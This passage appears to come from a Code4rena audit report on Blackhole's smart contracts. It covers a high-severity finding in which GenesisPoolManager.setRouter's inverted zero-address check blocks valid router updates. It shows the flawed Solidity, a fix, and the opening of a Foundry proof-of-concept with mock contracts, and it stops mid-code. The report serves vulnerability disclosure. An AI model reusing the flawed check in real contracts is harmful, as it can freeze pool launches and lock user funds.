<h1 style="position:relative;" id="severity-criteria"><a class="anchor before" aria-label="severity criteria permalink" href="#severity-criteria"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Criteria</h1>
<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>
<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>
<ul>
<li>Malicious Input Handling</li>
<li>Escalation of privileges</li>
<li>Arithmetic</li>
<li>Gas use</li>
</ul>
<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href="https://code4rena.com">the C4 website</a>, specifically our section on <a href="https://docs.code4rena.com/awarding/judging-criteria/severity-categorization">Severity Categorization</a>.</p>
<h1 style="position:relative;" id="high-risk-findings-2"><a class="anchor before" aria-label="high risk findings 2 permalink" href="#high-risk-findings-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>High Risk Findings (2)</h1>
<h2 style="position:relative;" id="h-01-router-address-validation-logic-error-prevents-valid-router-assignment"><a class="anchor before" aria-label="h 01 router address validation logic error prevents valid router assignment permalink" href="#h-01-router-address-validation-logic-error-prevents-valid-router-assignment"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-86">[H-01] Router address validation logic error prevents valid router assignment</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-245">francoHacker</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-243">AvantGard</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-397">dreamcoder</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-46">Egbe</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-319">FavourOkerri</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-489">harsh123</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-244">holtzzx</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-479">IzuMan</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-506">NexusAudits</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-293">rayss</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-529">Sparrow</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GenesisPoolManager.sol#L314</a></p>
<h3 style="position:relative;" id="finding-description"><a class="anchor before" aria-label="finding description permalink" href="#finding-description"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>setRouter(address _router)</code> function within the <code>GenesisPoolManager</code> contract is intended to allow the contract owner (<code>owner</code>) to modify the address of the <code>router</code> contract. This router is crucial for interacting with the decentralized exchange (DEX) when adding liquidity during the launch of a <code>GenesisPool</code>. However, the function contains a logical flaw in its <code>require</code> statement:</p>
<pre data-index="0" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setRouter</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// &lt;&lt;&lt; LOGICAL ERROR HERE</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>The line <code>require(_router == address(0), "ZA");</code> currently mandates that the <code>_router</code> address provided as an argument <em>must be</em> the zero address (<code>address(0)</code>). If any other address (i.e., a valid, non-zero router address) is supplied, the condition <code>_router == address(0)</code> will evaluate to false, and the transaction will revert with the error message “ZA” (presumably “Zero Address”).</p>
<p>This means the <code>setRouter</code> function’s behavior is inverted from what its name and intended purpose imply:</p>
<ul>
<li><strong>Current Behavior:</strong> It only allows the <code>owner</code> to set the <code>router</code> state variable to <code>address(0)</code>. It does not permit updating it to a new, functional router address.</li>
<li><strong>Expected Behavior (based on name and usage):</strong> It should allow the <code>owner</code> to set the <code>router</code> state variable to a new, valid, non-zero router address, likely with a check ensuring <code>_router</code> is not <code>address(0)</code> (i.e., <code>require(_router != address(0), "ZA");</code>).</li>
</ul>
<h3 style="position:relative;" id="root-cause"><a class="anchor before" aria-label="root cause permalink" href="#root-cause"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Root Cause</h3>
<p>The root cause of the issue is an incorrect condition in the <code>require</code> statement. The developer likely intended either to ensure a non-null router address was not being set (if such a check was desired for some specific reason, though unlikely for a setter) or, probably, to ensure a non-null address <em>was</em> being set. Instead, the implemented condition only permits setting a null address.</p>
<h3 style="position:relative;" id="impact"><a class="anchor before" aria-label="impact permalink" href="#impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>The impact of this logical error is significant and can lead to several adverse consequences:</p>
<ol>
<li>
<p><strong>Inability to update the router to a functional address:</strong></p>
<ul>
<li>If the <code>router</code> address is initially set during the <code>GenesisPoolManager</code> contract’s initialization (via the <code>initialize</code> function) and subsequently needs to be changed (e.g., due to a DEX router upgrade, an error in the initial configuration, or the deployment of a new router version), the current <code>setRouter</code> function will prevent this update to a functional address. The <code>owner</code> would only be able to “clear” the router address by setting it to <code>address(0)</code>.</li>
</ul>
</li>
<li>
<p><strong>Potential blocking of new pool launches (<code>_launchPool</code>):</strong></p>
<ul>
<li>The internal <code>_launchPool</code> function in <code>GenesisPoolManager</code> is responsible for finalizing a <code>GenesisPool</code>’s process and adding liquidity. This function calls <code>IGenesisPool(_genesisPool).launch(router, MATURITY_TIME)</code>, passing the <code>router</code> address stored in <code>GenesisPoolManager</code>.</li>
<li>If the <code>router</code> address in <code>GenesisPoolManager</code> is <code>address(0)</code> (either because it was mistakenly set that way initially or because the <code>owner</code> used <code>setRouter</code> to “clear” it), the call to <code>IGenesisPool.launch</code> will attempt to interact with an <code>IRouter(address(0))</code>.</li>
<li>Function calls to <code>address(0)</code> typically fail or behave unpredictably (depending on low-level Solidity/EVM implementation details, but practically, they will fail when trying to execute non-existent code or decode empty return data). This will cause the <code>GenesisPool</code>’s <code>launch</code> function to fail, and consequently, the <code>GenesisPoolManager</code>’s <code>_launchPool</code> function will also fail.</li>
<li>As a result, no new <code>GenesisPool</code> reaching the launch stage can be successfully launched if the router address is <code>address(0)</code>. Funds intended for liquidity (both <code>nativeToken</code> and <code>fundingToken</code>) could become locked in the <code>GenesisPool</code> contract indefinitely, or until an alternative solution is implemented (if possible via governance or contract upgradeability).</li>
</ul>
</li>
<li>
<p><strong>Dependency on correct initial configuration:</strong></p>
<ul>
<li>The system becomes overly reliant on the <code>router</code> address being perfectly configured during the <code>initialize</code> call. If there’s a typo or an incorrect address is provided, there is no way to correct it via <code>setRouter</code> unless the contract is upgradeable and the <code>setRouter</code> logic itself is updated.</li>
</ul>
</li>
<li>
<p><strong>Misleading functionality:</strong></p>
<ul>
<li>The function name <code>setRouter</code> is misleading, as it doesn’t “set” a functional router but rather only “clears” it (sets it to <code>address(0)</code>). This can lead to administrative errors and confusion.</li>
</ul>
</li>
</ol>
<h3 style="position:relative;" id="severity"><a class="anchor before" aria-label="severity permalink" href="#severity"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity</h3>
<p>High. Although the function is only accessible by the <code>owner</code>, its malfunction directly impacts a core functionality of the system (pool launching and liquidity provision). If the router needs to be changed or is misconfigured, this vulnerability can halt a critical part of the protocol.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps"><a class="anchor before" aria-label="recommended mitigation steps permalink" href="#recommended-mitigation-steps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>The condition in the <code>setRouter</code> function must be corrected to allow setting a non-null router address. The more common and expected logic would be:</p>
<pre data-index="1" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setRouter</span><span class="mtk1"> (</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_router</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">_router</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"ZA"</span><span class="mtk1">); </span><span class="mtk3">// CORRECTION: Ensure the new router is not the zero address.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">router</span><span class="mtk1"> = </span><span class="mtk12">_router</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This correction would enable the <code>owner</code> to update the <code>router</code> address to a new, valid address, ensuring the operational continuity and flexibility of the <code>GenesisPoolManager</code>.</p>
<h3 style="position:relative;" id="proof-of-concept"><a class="anchor before" aria-label="proof of concept permalink" href="#proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>Deploy a mock <code>GenesisPoolManager</code>.</li>
<li>Deploy mock contracts for <code>IRouter</code> (just to have distinct addresses).</li>
<li>Show that the <code>owner</code> <em>cannot</em> set a new, non-zero router address.</li>
<li>Show that the <code>owner</code> <em>can</em> set the router address to <code>address(0)</code>.</li>
<li>Illustrate (conceptually, as a full launch is complex) how a zero router address would break the <code>_launchPool</code> (or rather, the <code>launch</code> function it calls).</li>
</ol>
<details>
<pre data-index="2" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// SPDX-License-Identifier: UNLICENSED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> </span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"forge-std/console.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Minimal IRouter interface needed for the PoC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IRouter</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">someRouterFunction</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">pure</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Minimal IGenesisPool interface needed for the PoC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IGenesisPool</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">launch</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">router</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">maturityTime</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getGenesisInfo</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (IGenesisPoolBase.GenesisInfo </span><span class="mtk12">memory</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">getLiquidityPoolInfo</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (IGenesisPoolBase.LiquidityPool </span><span class="mtk12">memory</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Minimal IGenesisPoolBase (for structs)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IGenesisPoolBase</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">struct</span><span class="mtk1"> </span><span class="mtk12">GenesisInfo</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">tokenOwner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">nativeToken</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">fundingToken</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">stable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">startTime</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">duration</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">threshold</span><span class="mtk1">; </span><span class="mtk3">// 10000 = 100%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">startPrice</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">supplyPercent</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">maturityTime</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">struct</span><span class="mtk1"> </span><span class="mtk12">LiquidityPool</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pairAddress</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">gaugeAddress</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">internal_bribe</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">external_bribe</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Minimal IGauge interface needed for the PoC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IGauge</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setGenesisPool</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_genesisPool</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Minimal IBaseV1Factory interface needed for the PoC</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IBaseV1Factory</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setGenesisStatus</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pair</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">status</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// --- Mock Contracts ---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// A very simple mock router</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">MockRouter</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">IRouter</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">wasCalled</span><span class="mtk1"> = </span><span class="mtk4">false</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">someRouterFunction</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">pure</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Dummy addLiquidity to avoid reverts when called by MockGenesisPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">addLiquidity</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">wasCalled</span><span class="mtk1"> = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> (</span><span class="mtk7">1</span><span class="mtk1">,</span><span class="mtk7">1</span><span class="mtk1">,</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// A very simple mock GenesisPool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">MockGenesisPool</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">IGenesisPool</span><span class="mtk1">, </span><span class="mtk12">IGenesisPoolBase</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">currentRouter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">launchCalled</span><span class="mtk1"> = </span><span class="mtk4">false</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GenesisInfo</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">genesisInfo</span><span class="mtk1">; </span><span class="mtk3">// To satisfy getGenesisInfo</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">LiquidityPool</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">liquidityPoolInfo</span><span class="mtk1">; </span><span class="mtk3">// To satisfy getLiquidityPoolInfo</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
